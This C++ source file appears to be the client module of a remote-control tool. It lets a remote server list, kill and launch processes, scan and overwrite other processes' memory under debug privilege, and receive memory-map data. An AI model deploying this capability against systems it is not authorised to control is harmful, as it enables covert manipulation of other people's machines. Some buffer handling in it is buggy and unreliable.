#include "pch.h"
#include "ProcessManager.h"
#pragma warning(disable:4996)

struct UpdateSystemInfoParams
{
    PBYTE bufferData;
    ULONG_PTR BufferLength;
};

CProcessManager::CProcessManager(CIocpClient* IocpClient) :CManager(IocpClient)
{
	//回传数据包到服务器

	EnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_DEBUG_NAME);

	//当前客户端扫描所有正在运行的进程信息

	SendClientProcessList();
	m_CurrentProcessID = 0;
	m_Address = new vector<size_t>;
	m_ElementCount = 0;
	m_TargetHandle = INVALID_HANDLE_VALUE;
	m_ScanRelpy = 0;
}
CProcessManager::~CProcessManager()
{
	_tprintf(_T("~CProcessManager()\r\n"));
	EnableSeDebugPrivilege(GetCurrentProcess(), FALSE, SE_DEBUG_NAME);
	delete m_Address;
	m_Address = NULL;
}

void CProcessManager::HandleIo(PBYTE BufferData, ULONG_PTR BufferLength)
{
	BYTE IsToken;

	switch (BufferData[0])
	{
		case CLIENT_PROCESS_MANAGER_REFRESH_REQUIRE:
		{

		SendClientProcessList();

		break;
		}
		case CLIENT_PROCESS_MANAGER_KILL_REQUIRE:
		{

			//SeCreateProcess1((LPBYTE)BufferData + sizeof(BYTE), BufferLength - sizeof(BYTE));

			//SeCreateProcess6((LPBYTE)BufferData + sizeof(BYTE), BufferLength - sizeof(BYTE));
			KillProcess((LPBYTE)BufferData + sizeof(BYTE), BufferLength - sizeof(BYTE));

			break;
		}
		case CLIENT_PROCESS_MANAGER_CREATE_REQUIRE:
		{
			//SeCreateProcess1((LPBYTE)BufferData + sizeof(BYTE), BufferLength - sizeof(BYTE));
			XkCreateProcess((LPBYTE)BufferData + sizeof(BYTE), BufferLength - sizeof(BYTE));
			break;
		}
		case CLIENT_PROCESS_MANAGER_MEMORY_EDITOR_REQUIRE:
		{
			//MessageBox(NULL, NULL,NULL,NULL);
			memcpy(&m_CurrentProcessID, (LPBYTE)BufferData + sizeof(BYTE), sizeof(HANDLE));

			//通过进程ID打开目标进程空间
			HANDLE ProcessHandle = INVALID_HANDLE_VALUE;
			if (OpenProcessByProcessID(m_CurrentProcessID, &ProcessHandle) == FALSE)
			{
				//MessageBox(NULL, NULL, NULL, NULL);
			}
			m_TargetHandle = ProcessHandle;
			break;
		}
		case CLIENT_MEMORY_EDITOR_FIRST_SCAN_REQUIRE:
		{
			//MessageBox(NULL, NULL, NULL, NULL);
			MemoryFirstScan((LPBYTE)BufferData + sizeof(BYTE), sizeof(int));
			break;
		}
		case CLIENT_MEMORY_EDITOR_NEXT_SCAN_REQUIRE:
		{
			//MessageBox(NULL, NULL, NULL, NULL);
			MemoryNextScan((LPBYTE)BufferData + sizeof(BYTE), sizeof(int));
			break;
		}
		case CLIENT_MEMORY_EDITOR_UNDO_SCAN_REQUIRE:
		{
			MemoryUndoScan();
			break;
		}
		case CLIENT_MEMORY_EDITOR_CHANGE_VALUE_REQUIRE:
		{
			//EnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_DEBUG_NAME);
			MemoryValueChange((LPBYTE)BufferData + sizeof(BYTE), sizeof(int));
			//EnableSeDebugPrivilege(GetCurrentProcess(), FALSE, SE_DEBUG_NAME);
			break;
		}
		case CLIENT_VMMAP_SYSTEM_INFO_REQUIRE:
		{
			GetSystemInfo((LPBYTE)BufferData + sizeof(BYTE), sizeof(HANDLE));
			break;
		}
		case CLIENT_VMMAP_SYSTEM_INFO_UPDATE_REQUIRE:
		{
			//UpdateSystemInfoParams Parameter;
			//Parameter.bufferData = BufferData+sizeof(BYTE);
			//Parameter.BufferLength = sizeof(HANDLE);
			UpdateSystemInfo((LPBYTE)BufferData + sizeof(BYTE), sizeof(HANDLE));
			break;
		}

	}
	}
void CProcessManager::XkCreateProcess(PBYTE bufferData, ULONG_PTR BufferLength)
{
	EnableSeDebugPrivilege(GetCurrentProcess(),TRUE,SE_DEBUG_NAME);

	XkOpenProcess(bufferData, BufferLength);

	EnableSeDebugPrivilege(GetCurrentProcess(), FALSE, SE_DEBUG_NAME);
}

void CProcessManager::XkOpenProcess(PBYTE bufferData, ULONG_PTR BufferLength)
{

	TCHAR ApplicationName[MAX_PATH];
	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION ProcessInfo;
	BOOL IsOk = FALSE;
	ZeroMemory(ApplicationName, MAX_PATH);
	//传入的应用名需要带后缀.exe
	memcpy(ApplicationName, bufferData, BufferLength);
	//const TCHAR* PATH= _T("C:\\Windows\\System32\\");
	//// 连接 PATH 和 ApplicationName
	//TCHAR FullPath[MAX_PATH];
	//ZeroMemory(FullPath, MAX_PATH);
	//_tcscpy_s(FullPath, _tcslen(PATH) + 1, PATH);
	//_tcscat_s(FullPath, MAX_PATH, ApplicationName);
	const TCHAR* PATH = _T("C:\\Windows\\System32\\");

	// 连接 PATH 和 ApplicationName
	TCHAR FullPath[MAX_PATH];
	//_tcscpy_s(FullPath, _tcslen(PATH) + 1, PATH);
	memcpy(FullPath, PATH, _tcslen(PATH) + 1);
	_tcscat_s(FullPath, MAX_PATH, ApplicationName);

		
	//清空结构体的内存
	ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
	StartupInfo.cb = sizeof(STARTUPINFO);
	ZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));
	//创建子进程
	//第一个参数打开的话，需要是完整路径，第二个参数是打开当前目录下
	IsOk = CreateProcess(FullPath, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &StartupInfo, &ProcessInfo);
	DWORD LastError = GetLastError();
	if (!IsOk)
	{
		_tprintf(_T("CreateProcess failed\n"));
		return;
	}
	//等待直到子进程退出
	WaitForSingleObject(ProcessInfo.hProcess, INFINITE);

	// 关闭进程和线程句柄
	CloseHandle(ProcessInfo.hProcess);
	CloseHandle(ProcessInfo.hThread);
}

void CProcessManager::MemoryFirstScan(PBYTE bufferData, ULONG_PTR BufferLength)
{
	m_Address->clear();
	m_ElementCount = 0;
	HANDLE ProcessHandle = m_TargetHandle;
	int dataValue;
	memcpy(&dataValue, bufferData, sizeof(int));
	if (dataValue == 0) {
		return;
	}
	size_t VirtualAddress = 0;
	OSVERSIONINFO VersionInfo = { 0 };
	//HMODULE hMod = ::GetModuleHandleW(_T("ntdll.dll"));
	GetVersionEx(&VersionInfo);   //获得系统版本
	/*GetVersionEx函数已经在Windows 8.1和Windows Server 2012 R2之后的版本中被弃用，
	因为它不能正确地获取这些操作系统的版本信息*/
	if (VersionInfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
		VirtualAddress = 4 * 1024 * 1024;		     // Windows 98系列，4MB	
	else
		VirtualAddress = 64 * 1024;

	// Windows NT系列，64KB
	_MEMORY_BASIC_INFORMATION64 MemoryBasicInfo = { 0 };
	BYTE BufferData[PAGE_SIZE] = { 0 };
	while (VirtualAddress < RING3_LIMITED)
	{
		size_t BlockSize = 0;
		size_t NewAddress = -1;

		BlockSize = VirtualQueryEx(ProcessHandle, (LPCVOID)VirtualAddress,
			(PMEMORY_BASIC_INFORMATION)&MemoryBasicInfo, sizeof(MEMORY_BASIC_INFORMATION));
		size_t StartAddress = 0;
		size_t EndAddress = 0;
		if (BlockSize == sizeof(_MEMORY_BASIC_INFORMATION64))   //目标进程是64位
		{
			NewAddress = (size_t)MemoryBasicInfo.BaseAddress + (size_t)MemoryBasicInfo.RegionSize + 1;   //定位到下一个区域

			if (!(MemoryBasicInfo.Protect & (PAGE_NOACCESS | PAGE_GUARD)))
			{
				StartAddress = MemoryBasicInfo.BaseAddress;                                     //当前内存页可以写
				EndAddress = MemoryBasicInfo.BaseAddress + MemoryBasicInfo.RegionSize;
			}
		}
		else if (BlockSize == sizeof(_MEMORY_BASIC_INFORMATION32))  //目标进程是32位
		{
			_MEMORY_BASIC_INFORMATION32* MemoryBasicInfo32 = (_MEMORY_BASIC_INFORMATION32*)&MemoryBasicInfo;
			NewAddress = (size_t)MemoryBasicInfo32->BaseAddress + (size_t)MemoryBasicInfo32->RegionSize + 1;

			if (!(MemoryBasicInfo32->Protect & (PAGE_NOACCESS | PAGE_GUARD)))
			{
				StartAddress = MemoryBasicInfo32->BaseAddress;
				EndAddress = MemoryBasicInfo32->BaseAddress + MemoryBasicInfo32->RegionSize;
			}
		}
		if (StartAddress > 0 && EndAddress > 0)
		{
			StartAddress = StartAddress - (StartAddress % PAGE_SIZE);
			SIZE_T ReturnLength = 0;
			while (StartAddress < EndAddress)
			{
				if (ReadProcessMemory(ProcessHandle, (LPCVOID)((unsigned char*)StartAddress), BufferData, 0x1000, &ReturnLength)
					&& ReturnLength == PAGE_SIZE)
				{
					size_t* v1;
					for (int i = 0; i < (int)4 * 1024 - 3; i++)
					{
						v1 = (size_t*)&BufferData[i];
						if (v1[0] == dataValue)	// 等于要查找的值？
						{
							//if (__ArrayCount >= 1024)
							//	return FALSE;   //如果有需求使用动态
							// 添加到全局变量中
							m_Address->push_back(StartAddress + i);
							m_ElementCount++;
						}
					}
				}

				StartAddress += PAGE_SIZE;
			}
		}
		if (NewAddress <= VirtualAddress)
			break;
		VirtualAddress = NewAddress;
	}
	m_ScanRelpy = CLIENT_MEMORY_EDITOR_FIRST_SCAN_REPLY;
	SendClientAddressList();
}

void CProcessManager::MemoryNextScan(PBYTE bufferData, ULONG_PTR BufferLength)
{
	int v1 = m_ElementCount;   //[][]
	m_ElementCount = 0;
	HANDLE ProcessHandle = m_TargetHandle;
	int dataValue;
	memcpy(&dataValue, bufferData, sizeof(int));
	if (dataValue == 0) {
		return;
	}
	// 在m_AddressList数组记录的地址处查找
	BOOL IsOk = FALSE;	// 假设失败	
	size_t v3 = 0;
	for (int i = 0; i < v1; i++)
	{
		if (ReadProcessMemory(ProcessHandle, (LPCVOID)(*m_Address)[i], &v3, sizeof(size_t), NULL))
		{
			if (v3 == dataValue)
			{
				(*m_Address)[m_ElementCount++] = (*m_Address)[i];
				IsOk = TRUE;
			}
		}
	}
	m_ScanRelpy = CLIENT_MEMORY_EDITOR_NEXT_SCAN_REPLY;
	SendClientAddressList();

}

BOOL CProcessManager::SendClientAddressList()
{
	BOOL  IsOk = FALSE;
	DWORD offset = sizeof(BYTE);
	vector<size_t>* addressVector = m_Address;
	int length = sizeof(BYTE)+m_ElementCount * sizeof(size_t);
	if (length == 0)
	{
		return IsOk;
	}
	char* BufferData = NULL;
	int bufferLength = length;
	//BYTE* BufferData = new BYTE[bufferLength];
	BufferData = (char*)LocalAlloc(LPTR, bufferLength);
	if (BufferData == NULL)
	{
		goto Exit;
	}
	BufferData[0] = m_ScanRelpy;
	//memcpy(BufferData + sizeof(BYTE), addressVector->data(), bufferLength-sizeof(BYTE));

	for (int i = 0; i <m_ElementCount; i++)
	{
		//if (LocalSize(BufferData) < (offset + sizeof(size_t)))
		//{
		//	BufferData = (char*)LocalReAlloc(BufferData, (offset + sizeof(size_t)),
		//		LMEM_ZEROINIT | LMEM_MOVEABLE);
		//}
		memcpy(BufferData+ offset, &((*addressVector)[i]), sizeof(size_t));
		offset += sizeof(size_t);
	}

	m_IocpClient->OnSending((char*)BufferData, LocalSize(BufferData));
	IsOk = TRUE;
	Exit:
		if (BufferData != NULL)
		{
			LocalFree(BufferData);
			BufferData = NULL;
		}
	return IsOk;
}

void CProcessManager::MemoryUndoScan()
{
	m_Address->clear();
	m_ElementCount = 0;
	m_ScanRelpy = 0;
}

void CProcessManager::MemoryValueChange(PBYTE bufferData, ULONG_PTR BufferLength)
{
	HANDLE ProcessHandle = m_TargetHandle;
	//DWORD processID = (DWORD)m_CurrentProcessID;
	//HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
	size_t targetAddress;
	int targetValue=0;
	memcpy(&targetAddress, bufferData, sizeof(size_t));
	memcpy(&targetValue, bufferData + sizeof(size_t), sizeof(int));

	//DWORD flOldProtect;
	//if (!VirtualProtectEx(processHandle, (LPVOID)targetAddress, sizeof(targetAddress), PAGE_READWRITE, &flOldProtect)) {
	//	//MessageBox(NULL, "wrong", "wrong", NULL);
	//	BOOL LastError = GetLastError();
	//	CloseHandle(processHandle);
	//	return ;
	//}
	if (WriteProcessMemory(ProcessHandle, (LPVOID)targetAddress, &targetValue, sizeof(int), NULL)==TRUE)
	{
		//MessageBox(NULL,"yes","yes",NULL);
	}
	//BOOL Error = GetLastError();
	//VirtualProtectEx(processHandle, &targetAddress, sizeof(targetAddress), flOldProtect, NULL);
}

void CProcessManager::GetSystemInfo(PBYTE bufferData, ULONG_PTR BufferLength)
{
	HANDLE  processID;
	memcpy(&processID, bufferData, sizeof(HANDLE));
	QueryVMAdddress(processID);

}

void CProcessManager::QueryVMAdddress(HANDLE ProcessID)
{
	this->m_VMMap.GetSystemInfo();
	this->m_VMMap.GetMemoryStatus();
	if (this->m_VMMap.GetMemoryBasicInfo(ProcessID) == FALSE)
	{
		MessageBox(NULL,"获取信息失败!","错误",NULL);
		return;
	}
	DWORD LastError = GetLastError();
	DWORD v1=0;
	UINT Index = 0;
	list<MEMORY_BASIC_INFORMATION>::iterator Travel;
	PBYTE BufferData = NULL;
	DWORD Offset = sizeof(BYTE);
	BufferData = (PBYTE)LocalAlloc(LPTR, 0x1000);
	BufferData[0] = CLIENT_VMMAP_SYSTEM_INFO_REPLY;
	if (BufferData == NULL)
	{
		goto Exit;
	}

	//获取系统信息
	if (LocalSize(BufferData) < (Offset + v1))
	{
		BufferData = (PBYTE)LocalReAlloc(BufferData, (Offset + v1),
			LMEM_ZEROINIT | LMEM_MOVEABLE);
	}
	memcpy(BufferData + Offset, &(m_VMMap.SystemInfo), sizeof(SYSTEM_INFO));
	Offset += sizeof(SYSTEM_INFO);
	memcpy(BufferData + Offset, &(m_VMMap.MemoryStatus), sizeof(MEMORYSTATUS));
	Offset += sizeof(MEMORYSTATUS);
	//获取进程地址信息
	for (Travel = this->m_VMMap.MemoryBasicInfoList.begin();
		Travel != this->m_VMMap.MemoryBasicInfoList.end(); Travel++)
	{
		//获取系统信息
		v1 = sizeof(MEMORY_BASIC_INFORMATION);
		if (LocalSize(BufferData) < (Offset + v1))
		{
			BufferData = (PBYTE)LocalReAlloc(BufferData, (Offset + v1),
				LMEM_ZEROINIT | LMEM_MOVEABLE);
		}
		memcpy(BufferData + Offset, &(*Travel), sizeof(MEMORY_BASIC_INFORMATION));
		Offset += sizeof(MEMORY_BASIC_INFORMATION);
	}
	//Sleep(100);
	m_IocpClient->OnSending((char*)BufferData, LocalSize(BufferData));
Exit:
	if (BufferData != NULL)
	{
		LocalFree(BufferData);
		BufferData = NULL;
	}
}

void CProcessManager::UpdateSystemInfo(PBYTE bufferData, ULONG_PTR BufferLength)
{
	HANDLE  processID;
	memcpy(&processID, bufferData, sizeof(HANDLE));
	this->m_VMMap.GetSystemInfo();
	this->m_VMMap.GetMemoryStatus();
	if (this->m_VMMap.GetMemoryBasicInfo(processID) == FALSE)
	{
		MessageBox(NULL, "获取信息失败!", "错误", NULL);
		return;
	}
	DWORD LastError = GetLastError();
	DWORD v1 = 0;
	UINT Index = 0;
	list<MEMORY_BASIC_INFORMATION>::iterator Travel;
	PBYTE BufferData = NULL;
	DWORD Offset = sizeof(BYTE);
	BufferData = (PBYTE)LocalAlloc(LPTR, 0x1000);
	BufferData[0] = CLIENT_VMMAP_SYSTEM_INFO_UPDATE_REPLY;
	if (BufferData == NULL)
	{
		goto Exit;
	}

	//获取系统信息
	if (LocalSize(BufferData) < (Offset + v1))
	{
		BufferData = (PBYTE)LocalReAlloc(BufferData, (Offset + v1),
			LMEM_ZEROINIT | LMEM_MOVEABLE);
	}
	memcpy(BufferData + Offset, &(m_VMMap.SystemInfo), sizeof(SYSTEM_INFO));
	Offset += sizeof(SYSTEM_INFO);
	memcpy(BufferData + Offset, &(m_VMMap.MemoryStatus), sizeof(MEMORYSTATUS));
	Offset += sizeof(MEMORYSTATUS);
	m_IocpClient->OnSending((char*)BufferData, LocalSize(BufferData));
Exit:
	if (BufferData != NULL)
	{
		LocalFree(BufferData);
		BufferData = NULL;
	}
}

BOOL CProcessManager::SendClientProcessList()
{

		BOOL  IsOk = FALSE;
		DWORD Offset = 1;
		DWORD v1 = 0;
		ULONG ItemCount = 0;
		char* BufferData = NULL;
		vector<PROCESS_INFORMATION_ITEM> ProcessItemInfoVector;
		vector<PROCESS_INFORMATION_ITEM>::iterator i;
		if (EnumProcessByToolHelp32(ProcessItemInfoVector) == FALSE)
		{
			return IsOk;
		}
		BufferData = (char*)LocalAlloc(LPTR, 0x1000);
		if (BufferData == NULL)
		{
			goto Exit;
		}
		BufferData[0] = CLIENT_PROCESS_MANAGER_REPLY;

		//遍历模板数据
		//[CLIENT_PROCESS_MANAGER_REPLY][ProcessID][ProcessImageName\0][ProcessFullPath\0][位数\0][ProcessID]......
		for (i = ProcessItemInfoVector.begin(); i != ProcessItemInfoVector.end(); i++)
		{
			v1 = sizeof(HANDLE) +
				lstrlen(i->ProcessImageName) + lstrlen(i->ProcessFullPath) + lstrlen(i->isWow64Process) + 3;
			// 缓冲区太小，再重新分配下
			if (LocalSize(BufferData) < (Offset + v1))
			{
				BufferData = (char*)LocalReAlloc(BufferData, (Offset + v1),
					LMEM_ZEROINIT | LMEM_MOVEABLE);
			}

			memcpy(BufferData + Offset, &(i->ProcessIdentity), sizeof(HANDLE));
			Offset += sizeof(HANDLE);
			memcpy(BufferData + Offset, i->ProcessImageName, lstrlen(i->ProcessImageName) + 1);
			Offset += lstrlen(i->ProcessImageName) + 1;
			memcpy(BufferData + Offset, i->ProcessFullPath, lstrlen(i->ProcessFullPath) + 1);
			Offset += lstrlen(i->ProcessFullPath) + 1;
			memcpy(BufferData + Offset, i->isWow64Process, lstrlen(i->isWow64Process) + 1);
			Offset += lstrlen(i->isWow64Process) + 1;
		}
		m_IocpClient->OnSending((char*)BufferData, LocalSize(BufferData));
		IsOk = TRUE;
	Exit:
		if (BufferData != NULL)
		{
			LocalFree(BufferData);
			BufferData = NULL;
		}
	return IsOk;
}




